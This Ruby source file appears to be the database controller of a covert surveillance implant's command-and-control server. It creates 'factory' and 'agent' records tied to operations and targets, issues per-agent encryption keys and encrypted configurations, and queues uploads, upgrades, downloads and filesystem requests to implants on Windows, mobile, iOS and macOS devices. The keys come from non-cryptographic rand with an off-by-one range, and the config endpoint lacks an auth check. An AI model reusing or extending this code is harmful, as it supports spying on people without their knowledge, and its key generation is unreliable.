#
# Controller for the Agent objects
#
require_relative '../license'
require 'rcs-common/crypt'

module RCS
module DB

class AgentController < RESTController
  include RCS::Crypt
  
  def index
    require_auth_level :tech, :view
    
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
    filter ||= {}

    mongoid_query do
      items = ::Item.where(filter)
        .any_in(_id: @session[:accessible], _kind: ['agent', 'factory'])
        .only(:name, :desc, :status, :_kind, :path, :stat, :type, :ident, :platform, :uninstalled)
        
      ok(items)
    end
  end
  
  def show
    require_auth_level :tech, :view
    
    mongoid_query do
      item = Item.agents
        .any_in(_id: @session[:accessible], _kind: ['agent', 'factory'])
        .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :instance, :platform, :upgradable, :uninstalled, :deleted, :demo, :type, :version, :counter, :configs)
        .find(@params['_id'])
      
      ok(item)
    end
  end
  
  def update
    require_auth_level :tech
    
    updatable_fields = ['name', 'desc', 'status']
    
    mongoid_query do
      item = Item.any_in(_id: @session[:accessible]).find(@params['_id'])
      
      @params.delete_if {|k, v| not updatable_fields.include? k }
      
      @params.each_pair do |key, value|
        if item[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name],
                    :action => "#{item._kind}.update",
                    item._kind.to_sym => item['name'],
                    :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
        end
      end
      
      item.update_attributes(@params)
      
      return ok(item)
    end
  end
  
  def destroy
    require_auth_level :tech
    
    mongoid_query do
      item = Item.agents.any_in(_id: @session[:accessible]).find(@params['_id'])
      item.destroy
      
      Audit.log :actor => @session[:user][:name],
                :action => "#{item._kind}.delete",
                item._kind.to_sym => @params['name'],
                :desc => "Deleted #{item._kind} '#{item['name']}'"
      
      return ok
    end
  end
  
  def create
    require_auth_level :tech

    # to create a target, we need to owning operation
    return bad_request('INVALID_OPERATION') unless @params.has_key? 'operation'
    return bad_request('INVALID_TARGET') unless @params.has_key? 'target'

    mongoid_query do

      operation = ::Item.operations.find(@params['operation'])
      return bad_request('INVALID_OPERATION') if operation.nil?

      target = ::Item.targets.find(@params['target'])
      return bad_request('INVALID_TARGET') if target.nil?

      # used to generate log/conf keys and seed
      alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'

      item = Item.create!(desc: @params['desc']) do |doc|
        doc[:_kind] = :factory
        doc[:path] = [operation._id, target._id]
        doc[:status] = :open
        doc[:ident] = get_new_ident
        doc[:name] = @params['name']
        doc[:name] ||= doc[:ident]
        doc[:counter] = 0
        seed = (0..11).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
        seed.setbyte(8, 46)
        doc[:seed] = seed
        doc[:confkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
        doc[:logkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
        doc[:configs] = []
      end
      
      @session[:accessible] << item._id
      
      Audit.log :actor => @session[:user][:name],
                :action => "factory.create",
                :operation => operation['name'],
                :target => target['name'],
                :agent => item['name'],
                :desc => "Created factory '#{item['name']}'"

      item = Item.factories
        .only(:name, :desc, :status, :_kind, :path, :ident, :counter, :configs)
        .find(item._id)

      ok(item)
    end
  end

  def get_new_ident
    global = ::Item.where({_kind: 'global'}).first
    global ||= ::Item.new({_kind: 'global', counter: 0}).save
    global.inc(:counter, 1)
    "RCS_#{global.counter.to_s.rjust(10, "0")}"
  end

  def add_config
    require_auth_level :tech
    
    mongoid_query do
      agent = Item.any_in(_id: @session[:accessible]).find(@params['_id'])

      @params['desc'] ||= ''
      
      case agent._kind
        when 'agent'
          # the config was not sent, replace it
          if agent.configs.last.sent.nil? or agent.configs.last.sent == 0
            @params.delete('_id')
            agent.configs.last.update_attributes(@params)
            config = agent.configs.last
          else
            config = agent.configs.create!(config: @params['config'], desc: @params['desc'])
          end
          
          config.saved = Time.now.getutc.to_i
          config.user = @session[:user][:name]
          config.save
        when 'factory'
          agent.configs.delete_all
          config = agent.configs.create!(config: @params['config'], user: @session[:user][:name], saved: Time.now.getutc.to_i)
      end
      
      Audit.log :actor => @session[:user][:name],
                :action => "#{agent._kind}.add_config",
                agent._kind.to_sym => @params['name'],
                :desc => "Saved configuration for agent '#{agent['name']}'"
      
      return ok(config)
    end
  end
  
  def del_config
    require_auth_level :tech

    mongoid_query do
      agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
      agent.configs.find(@params['config_id']).destroy

      Audit.log :actor => @session[:user][:name],
                :action => "#{agent._kind}.del_config",
                agent._kind.to_sym => @params['name'],
                :desc => "Deleted configuration for agent '#{agent['name']}'"
      
      return ok
    end
  end
  
  # retrieve the factory key of the agents
  # if the parameter is specified, it take only that class
  # otherwise, return all the keys for all the classes
  def factory_keys
    require_auth_level :server
    
    classes = {}
    
    # request for a specific instance
    if @params['_id']
      Item.where({_kind: 'factory', ident: @params['_id']}).each do |entry|
          classes[entry[:ident]] = entry[:confkey]
      end
    # all of them
    else
      Item.where({_kind: 'factory'}).each do |entry|
          classes[entry[:ident]] = entry[:confkey]
        end
    end
    
    return ok(classes)
  end
  
  # retrieve the status of a agent instance.
  def status
    require_auth_level :server
    
    # parse the platform to check if the agent is in demo mode ( -DEMO appended )
    demo = @params['subtype'].end_with? '-DEMO'
    platform = @params['subtype'].gsub(/-DEMO/, '').downcase
    
    # retro compatibility for older agents (pre 8.0) sending win32, win64, ios, osx
    case platform
      when 'win32', 'win64'
        platform = 'windows'
      when 'winmobile'
        platform = 'winmo'
      when 'iphone'
        platform = 'ios'
      when 'macos'
        platform = 'osx'
    end
    
    # is the agent already in the database? (has it synchronized at least one time?)
    agent = Item.where({_kind: 'agent', ident: @params['ident'], instance: @params['instance'], platform: platform, demo: demo}).first

    # yes it is, return the status
    unless agent.nil?
      trace :info, "#{agent[:name]} is synchronizing (#{agent[:status]})"

      # if the agent was queued, but now we have a license, use it and set the status to open
      # a demo agent will never be queued
      if agent[:status] == 'queued' and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym)
        agent.status = 'open'
        agent.save
      end

      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
      return ok(status)
    end

    # search for the factory of that instance
    factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first

    # the status of the factory must be open otherwise no instance can be cloned from it
    return not_found if factory.nil?

    # increment the instance counter for the factory
    factory[:counter] += 1
    factory.save

    trace :info, "Creating new instance for #{factory[:ident]} (#{factory[:counter]})"

    # clone the new instance from the factory
    agent = factory.clone_instance

    # specialize it with the platform and the unique instance
    agent.platform = platform
    agent.instance = @params['instance']
    agent.demo = demo

    # default is queued
    agent.status = 'queued'

    #TODO: add the upload files for the first sync

    # demo agent don't consume any license
    agent.status = 'open' if demo

    # check the license to see if we have room for another agent
    if demo == false and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym)
      agent.status = 'open'
    end

    # save the new instance in the db
    agent.save

    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
    return ok(status)
  end


  def config
    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

    case @request[:method]
      when 'GET'
        config = agent.configs.where(:activated.exists => false).last
        return not_found if config.nil?

        # we have sent the configuration, wait for activation
        config.sent = Time.now.getutc.to_i
        config.save

        # encrypt the config for the agent using the confkey
        enc_config = config.encrypted_config(agent[:confkey])
        
        return ok(enc_config, {content_type: 'binary/octet-stream'})
        
      when 'DELETE'
        config = agent.configs.where(:activated.exists => false).last
        config.activated = Time.now.getutc.to_i
        config.save
        trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
    end
    
    return ok
  end


  # retrieve the list of upload for a given agent
  def uploads
    require_auth_level :server, :tech

    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.upload_requests

    return ok(list)
  end

  # retrieve or delete a single upload entity
  def upload
    require_auth_level :server, :tech

    case @request[:method]
      when 'GET'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        upl = agent.upload_requests.where({ _id: @params['upload']}).first
        content = GridFS.get upl[:_grid].first
        trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
        return ok(content.read, {content_type: content.content_type})
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.upload_requests.destroy_all(conditions: { _id: @params['upload']})
        trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
    end
    
    return ok
  end
  
  # retrieve the list of upgrade for a given agent
  def upgrades
    require_auth_level :server, :tech
    
    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.upgrade_requests

    return ok(list)
  end
  
  # retrieve or delete a single upgrade entity
  def upgrade
    require_auth_level :server, :tech

    case @request[:method]
      when 'GET'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        upl = agent.upgrade_requests.where({ _id: @params['upgrade']}).first
        content = GridFS.get upl[:_grid].first
        trace :info, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
        return ok(content.read, {content_type: content.content_type})
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.upgrade_requests.destroy_all
        trace :info, "[#{@request[:peer]}] Deleted the UPGRADE #{@params['upgrade']}"
    end
    
    return ok
  end

  # retrieve the list of download for a given agent
  def downloads
    require_auth_level :server, :tech

    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.download_requests

    return ok(list)
  end

  def download
    require_auth_level :server, :tech

    case @request[:method]
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.download_requests.destroy_all(conditions: { _id: @params['download']})
        trace :info, "[#{@request[:peer]}] Deleted the DOWNLOAD #{@params['download']}"
    end

    return ok
  end

  # retrieve the list of filesystem for a given agent
  def filesystems
    require_auth_level :server, :tech
    
    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.filesystem_requests

    return ok(list)
  end
  
  def filesystem
    require_auth_level :server, :tech

    case @request[:method]
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
        trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
    end
    
    return ok
  end

end

end #DB::
end #RCS::
